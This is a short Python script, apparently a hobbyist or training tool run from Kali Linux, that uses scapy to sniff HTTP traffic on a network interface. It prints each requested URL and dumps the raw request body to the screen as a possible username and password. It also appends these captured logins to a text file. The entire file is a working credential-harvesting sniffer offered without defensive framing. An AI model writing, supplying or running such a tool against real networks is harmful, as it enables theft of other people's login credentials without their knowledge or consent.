from ast import keyword
from scapy.layers import http
import scapy.all as scapy
import optparse

def getArguments():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--interface', dest= 'interface', help='Network interface (e.g "eth0")')

    options = parser.parse_args()[0]
    return options

# Recieve all packets connected to the network
def sniff(interface):
    print('Sniffing login credentials way HTTP...\n')
    scapy.sniff(iface= interface, store= False, prn= processSniffedPacket)

def processSniffedPacket(packet):
    # Print packets from HTTP layer into Raw section that is where login datas are stored 
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f'HTTP Request >> {url.decode()}')

        # Obtain scapy.Raw data where user and password are stored
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            #keywords = ['username', 'user', 'login', 'password', 'pass']
            print(f'\n\nUsuario y contraseña posible >> {load.decode()}\n\n')

            with open('/home/kali/Desktop/logins.txt', 'a') as f:
                f.writelines(f'Sitio web: {url}\nLogin: {load.decode()}\n')

            '''for i in keywords:
                if i in load:
                    print(load)
                    break'''

try:
    net_interface = getArguments()
    sniff(net_interface.interface)
except KeyboardInterrupt:
    print('Program finished')
